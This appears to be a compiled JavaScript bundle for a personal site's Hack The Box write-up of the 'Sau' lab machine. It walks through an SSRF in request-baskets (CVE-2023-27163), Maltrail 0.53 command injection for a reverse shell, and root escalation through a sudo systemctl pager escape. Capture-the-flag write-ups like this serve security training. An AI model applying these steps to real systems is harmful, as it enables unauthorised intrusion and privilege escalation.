"use strict";(self.webpackChunkhacking=self.webpackChunkhacking||[]).push([[6596],{2891:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>d,frontMatter:()=>r,metadata:()=>i,toc:()=>l});var s=t(5893),a=t(1151);const r={slug:"/write-up/htb/easy/sau",pagination_next:null,pagination_prev:null},o=void 0,i={id:"Hacking/Write-ups/Hack the box/easy/Sau/Sau",title:"Sau",description:"Enumeration",source:"@site/docs/Hacking/Write-ups/Hack the box/easy/Sau/Sau.md",sourceDirName:"Hacking/Write-ups/Hack the box/easy/Sau",slug:"/write-up/htb/easy/sau",permalink:"/docs/write-up/htb/easy/sau",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{slug:"/write-up/htb/easy/sau",pagination_next:null,pagination_prev:null},sidebar:"tutorialSidebar"},c={},l=[{value:"Enumeration",id:"enumeration",level:2},{value:"Foothold",id:"foothold",level:2},{value:"Privilege escalation",id:"privilege-escalation",level:2}];function h(e){const n={a:"a",code:"code",h2:"h2",p:"p",pre:"pre",...(0,a.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h2,{id:"enumeration",children:"Enumeration"}),"\n",(0,s.jsx)(n.p,{children:"Initial scan shows some open ports:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500\u2500\u257c $nmap sau.htb -oA scans/initial_scan -Pn -n\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-09-27 19:10 BST\nNmap scan report for sau.htb (10.10.11.224)\nHost is up (0.14s latency).\nNot shown: 997 closed tcp ports (conn-refused)\nPORT      STATE    SERVICE\n22/tcp    open     ssh\n80/tcp    filtered http\n55555/tcp open     unknown\n\nNmap done: 1 IP address (1 host up) scanned in 20.00 seconds\n"})}),"\n",(0,s.jsx)(n.p,{children:"Port 80 is behind a firewall."}),"\n",(0,s.jsx)(n.p,{children:"SSH:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500\u2500\u257c $nmap sau.htb -oA scans/ssh_scan -Pn -n -p22 -sC -sV\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-09-27 19:11 BST\nNmap scan report for sau.htb (10.10.11.224)\nHost is up (0.19s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 4.73 seconds\n"})}),"\n",(0,s.jsx)(n.p,{children:"We are dealing with an ubuntu focal."}),"\n",(0,s.jsxs)(n.p,{children:["55555:\nThe nmap is taking a lot of time in determining the service. However, if we ",(0,s.jsx)(n.code,{children:"curl"})," the port, we can see that it's a webserver:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'\u2514\u2500\u2500\u257c $curl -vvv sau.htb:55555\n*   Trying 10.10.11.224:55555...\n* Connected to sau.htb (10.10.11.224) port 55555 (#0)\n> GET / HTTP/1.1\n> Host: sau.htb:55555\n> User-Agent: curl/7.88.1\n> Accept: */*\n> \n< HTTP/1.1 302 Found\n< Content-Type: text/html; charset=utf-8\n< Location: /web\n< Date: Wed, 27 Sep 2023 18:17:35 GMT\n< Content-Length: 27\n< \n<a href="/web">Found</a>.\n'})}),"\n",(0,s.jsx)(n.p,{children:"The result from nmap came back and say that it cannot determine the service. We can see that if has something to do with baskets:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"|     invalid basket name; the name does not match pattern: ^[wd-_\\.]{1,250}$\n"})}),"\n",(0,s.jsx)(n.p,{children:"If we curl the home page, we can see something interesting:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-html",children:'        <small>\n          Powered by <a href="https://github.com/darklynx/request-baskets">request-baskets</a> |\n          Version: 1.2.1\n        </small>\n'})}),"\n",(0,s.jsx)(n.p,{children:'Checking the website source code from the browser, we can see that there\'s a basket API which used a "Master token" for auth.'}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-js",children:'        $.ajax({\n          method: "POST",\n          url: "/api/baskets/" + basket,\n          headers: {\n            "Authorization" : sessionStorage.getItem("master_token")\n          }\n'})}),"\n",(0,s.jsx)(n.p,{children:"After reading a bit, looks like the service is a server used to display HTTP requests"}),"\n",(0,s.jsx)(n.h2,{id:"foothold",children:"Foothold"}),"\n",(0,s.jsx)(n.p,{children:"Knowing the service and version, we can search for CVEs."}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{href:"https://github.com/entr0pie/CVE-2023-27163",children:"https://github.com/entr0pie/CVE-2023-27163"})}),"\n",(0,s.jsx)(n.p,{children:"Looks like we can abuse of the request-baskets to access the webserver listening on port 80 but firewalled and...it's working:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'\u250c\u2500[parrot@parrot]\u2500[~/workspace/gal/htb/machines/sau/exploits]\n\u2514\u2500\u2500\u257c $./CVE-2023-27163.sh http://sau.htb:55555/ http://127.0.0.1\nProof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163\n\n> Creating the "zfqies" proxy basket...\n> Basket created!\n> Accessing http://sau.htb:55555/zfqies now makes the server request to http://127.0.0.1.\n> Authorization: sXxaCFrbUXtDv3qiltNRTbGju6JosLVH8fL2DkqyeiN9\n'})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'\u2514\u2500\u2500\u257c $curl -vvv http://sau.htb:55555/zfqies\n*   Trying 10.10.11.224:55555...\n* Connected to sau.htb (10.10.11.224) port 55555 (#0)\n> GET /zfqies HTTP/1.1\n> Host: sau.htb:55555\n> User-Agent: curl/7.88.1\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< Cache-Control: no-cache\n< Connection: close\n< Content-Security-Policy: default-src \'self\'; style-src \'self\' \'unsafe-inline\'; img-src * blob:; script-src \'self\' \'unsafe-eval\' https://stat.ripe.net; frame-src *; object-src \'none\'; block-all-mixed-content;\n< Content-Type: text/html\n< Date: Thu, 28 Sep 2023 09:29:31 GMT\n< Last-Modified: Tue, 31 Jan 2023 18:18:07 GMT\n< Server: Maltrail/0.53\n< Transfer-Encoding: chunked\n< \n<!DOCTYPE html>\n<html lang="en">\n    <head>\n        <meta http-equiv="X-UA-Compatible" content="IE=edge">\n        <meta http-equiv="Content-Type" content="text/html;charset=utf8">\n        <meta name="viewport" content="width=device-width, user-scalable=no">\n        <meta name="robots" content="noindex, nofollow">\n'})}),"\n",(0,s.jsxs)(n.p,{children:["In the firewalled webserver there's an instance of maltrail 0.53 service, which making a quick google search has a OS command injection vulnerability in the username field of the /login endpoint. There's even a metasploit module to explot it. See: ",(0,s.jsx)(n.a,{href:"https://packetstormsecurity.com/files/174221/Maltrail-0.53-Unauthenticated-Command-Injection.html",children:"https://packetstormsecurity.com/files/174221/Maltrail-0.53-Unauthenticated-Command-Injection.html"})]}),"\n",(0,s.jsx)(n.p,{children:"I've made some attempts with the bash and sh payloads from reverse shell and base64 encoded, also play around with data encoding (url encode, form encode, ...)"}),"\n",(0,s.jsx)(n.p,{children:"Finally I've made it work by using a python payload, base64 and form encoding."}),"\n",(0,s.jsx)(n.p,{children:"We can read the user flag"}),"\n",(0,s.jsx)(n.h2,{id:"privilege-escalation",children:"Privilege escalation"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"sudo -l"})," shows that the user can execute systemctl status as any user (including root):"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Let's search how to explot that in GTFO bins, looks like the default pager for systemctl is ",(0,s.jsx)(n.code,{children:"less"}),", we can have access to root by just typing: ",(0,s.jsx)(n.code,{children:"!sh"})," and voila!"]}),"\n",(0,s.jsx)(n.p,{children:"We can read root flag."})]})}function d(e={}){const{wrapper:n}={...(0,a.a)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(h,{...e})}):h(e)}},1151:(e,n,t)=>{t.d(n,{Z:()=>i,a:()=>o});var s=t(7294);const a={},r=s.createContext(a);function o(e){const n=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:o(e.components),s.createElement(r.Provider,{value:n},e.children)}}}]);